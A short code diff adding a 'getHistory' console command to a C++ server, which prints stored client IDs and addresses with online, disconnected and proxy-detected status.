@@ -59,6 +59,48 @@ int32_t main(int32_t argc, char **argv) {
             }
         }
 
+        if (sh == "getHistory") {
+            std::vector<std::string> CID;
+            std::vector<sys::ClientConnectionData> clients;
+
+            if (server.getCID().size() > 0)
+                clients = server.getHistory();
+
+            for (int i = 0; i < clients.size(); i++)
+                CID.push_back(clients.at(i).CID);
+
+            if (CID.size() != clients.size())
+                std::cout << "List broken" << std::endl;
+
+            else {
+                for (int32_t i = 0; i < CID.size(); i++) {
+                    if (clients.at(i).proxy_hint) {
+                        if (clients.at(i).is_online)
+                            std::cout << "_______________" << std::endl
+                                      << "ClientId: "      << CID.at(i).data()    << " - proxy_hint_detected" << std::endl
+                                      << "ClientAddress: " << clients.at(i).host  << " - [ONLINE]"            << std::endl;
+
+                        else
+                            std::cout << "_______________" << std::endl
+                                      << "ClientId: "      << CID.at(i).data()    << " - proxy_hint_detected" << std::endl
+                                      << "ClientAddress: " << clients.at(i).host  << " - [DISCONNECTED]"      << std::endl;
+                    }
+
+                    else {
+                        if (clients.at(i).is_online)
+                            std::cout << "_______________" << std::endl
+                                      << "ClientId: "      << CID.at(i).data()                                << std::endl
+                                      << "ClientAddress: " << clients.at(i).host  << " - [ONLINE]"            << std::endl;
+
+                        else
+                            std::cout << "_______________" << std::endl
+                                      << "ClientId: "      << CID.at(i).data()                                << std::endl
+                                      << "ClientAddress: " << clients.at(i).host  << " - [DISCONNECTED]"      << std::endl;
+                    }
+                }
+            }
+        }
+
         if (sh == "proxyEnable") {
             uint32_t _CID = 0;
 
